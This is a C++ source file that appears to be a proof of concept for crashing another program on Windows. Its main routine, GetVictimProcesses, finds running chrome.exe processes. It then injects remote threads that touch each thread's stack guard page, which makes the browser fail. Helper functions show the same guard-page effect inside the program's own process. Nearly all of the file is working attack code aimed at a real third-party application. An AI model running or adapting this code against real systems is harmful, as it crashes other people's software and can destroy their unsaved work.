// SameProcess.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

DWORD GetProcessIdByName(const wchar_t* name) {
    HANDLE process_snapshot;
    PROCESSENTRY32 process_entry;

    process_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(process_snapshot == INVALID_HANDLE_VALUE)
        return 0;

    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(process_snapshot, &process_entry)) return 0;

    do {
        if (wcscmp(process_entry.szExeFile, name) == 0) {
            CloseHandle(process_snapshot);
            return process_entry.th32ProcessID;
        }
    } while(Process32Next( process_snapshot, &process_entry));

    CloseHandle(process_snapshot);
    return 0;
}

DWORD_PTR GetThreadTIBAddress(DWORD thread_id) {
    HANDLE thread_handle = OpenThread(
        THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION,
        FALSE,
        thread_id
    );
    if (thread_handle == NULL)
        return 0;

    CONTEXT context;
    context.ContextFlags = CONTEXT_SEGMENTS;
    if (!GetThreadContext(thread_handle, &context)) {
        CloseHandle(thread_handle);
        return 0;
    }

    LDT_ENTRY ldtSel;
    if (!GetThreadSelectorEntry(thread_handle, context.SegFs, &ldtSel))
        return 0;
       
    DWORD_PTR fs_base = \
          (ldtSel.HighWord.Bits.BaseHi << 24 )
        | ( ldtSel.HighWord.Bits.BaseMid << 16 )
        | ( ldtSel.BaseLow );
    return fs_base + 0x18;
}


static void ReadAccessProcStackGuardMem(HANDLE hProcess, DWORD_PTR tibAddr) {
    DWORD_PTR tibPtr;
    _NT_TIB tib;

    if (ReadProcessMemory(hProcess, (LPCVOID)(tibAddr), (LPVOID)&tibPtr, sizeof(tibPtr), NULL) == 0)
        return;

    if (ReadProcessMemory(hProcess, (LPCVOID)(tibPtr), (LPVOID)&tib, sizeof(tib), NULL) == 0)
        return;

    LPVOID _IsBadCodePtr;
    HANDLE hRemoteThread;
    DWORD remoteThreadId;
    _IsBadCodePtr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "IsBadCodePtr");
    hRemoteThread = CreateRemoteThread(
        hProcess,
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE)_IsBadCodePtr,
        (LPVOID)((DWORD_PTR)tib.StackLimit - sizeof(DWORD_PTR)),
        NULL,
        &remoteThreadId
    );
    if (hRemoteThread == NULL)
        return;

    WaitForSingleObject(hRemoteThread, 10000);
}

void ListProcessThreads(HANDLE hProcess, DWORD owner_pid) { 
    HANDLE thread_snapshot = INVALID_HANDLE_VALUE; 
    THREADENTRY32 thread_entry;
 
    thread_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
    if(thread_snapshot == INVALID_HANDLE_VALUE)
        return;
 
    thread_entry.dwSize = sizeof(THREADENTRY32); 
 
    if(!Thread32First(thread_snapshot, &thread_entry ))
        return;

    do { 
        if (thread_entry.th32OwnerProcessID == owner_pid) {
            //fwprintf(stdout, L"[i] thread_id = %d \n", thread_entry.th32ThreadID);
            DWORD_PTR tibAddr = GetThreadTIBAddress(thread_entry.th32ThreadID);
            if (tibAddr != 0)
                ReadAccessProcStackGuardMem(hProcess, tibAddr);
        }
    } while(Thread32Next(thread_snapshot, &thread_entry )); 

    CloseHandle(thread_snapshot);
}

static void GetVictimProcesses()
{
    DWORD aProcesses[4096], bytesReturned;

    if (EnumProcesses(aProcesses, sizeof(aProcesses), &bytesReturned) != 0) {
        for (unsigned i = 0; i < bytesReturned / sizeof(DWORD); i++) {
            DWORD processID = aProcesses[i];
            CHAR szProcessName[MAX_PATH];

            HANDLE hProcess = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
                FALSE,
                processID
            );

            if (hProcess == NULL)
                continue;

            DWORD nSize = sizeof(szProcessName)/sizeof(szProcessName[0]);
            if (GetModuleFileNameExA(hProcess, NULL, szProcessName, nSize) == 0)
                continue;

            PathStripPathA(szProcessName);
            if (strcmp(szProcessName, "chrome.exe") == 0)
                ListProcessThreads(hProcess, processID);
        }
    }
}

// Using Microsoft's intrinsics instead of inline assembly
static _NT_TIB * getTib()
{
    return (_NT_TIB *) __readfsdword(0x18);
}

void Crash() {
    printf("Crash\n");

    // This function simply allocate a big local array and initalizes first element
    volatile char test[0x4000];
    test[0] = 0;
}

static unsigned __stdcall ThreadProc(LPVOID param) {
    printf ("ThreadProc\n\tTry to access Stack Guard Page\n");
    
    // param points stack limit of main thread
    // try to read access stack guard page of the main thread.
    volatile SIZE_T mem = *((SIZE_T *)param-1);
    return 0;
}

static void AccessStackGuardFromOtherThread() {
    printf("AccessStackGuardFromOtherThread\n");

    _NT_TIB * tib = getTib();

    HANDLE exceptionThread = (HANDLE)_beginthreadex(
        NULL,
        0,          // stack size
        ThreadProc,
        tib->StackLimit, // <== Pass the stack top memory location
        0,          // suspended = false
        NULL
    );
    
    // Wait for the thread finish
    WaitForSingleObject(exceptionThread, INFINITE);
}

static LONG WINAPI OurUnhandledExceptionFilter (EXCEPTION_POINTERS * ep) {
    printf(
        "OurUnhandledExceptionFilter: exception code = %X\n",
        ep->ExceptionRecord->ExceptionCode
    );  
    
    if (ep->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
        printf(
            "STATUS_GUARD_PAGE_VIOLATION :%0X\n",
            ep->ExceptionRecord->ExceptionInformation[1]
        );
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_EXECUTE_HANDLER;
}

int _tmain(int argc, _TCHAR* argv[]) {
    GetVictimProcesses();
    // Set our unhandled exception filter to see what exception occurs
    // but it's not necessary to demonstrate the problem.
    SetUnhandledExceptionFilter(OurUnhandledExceptionFilter);

    printf("End of Program.\n");   // <=== This will never be called
}
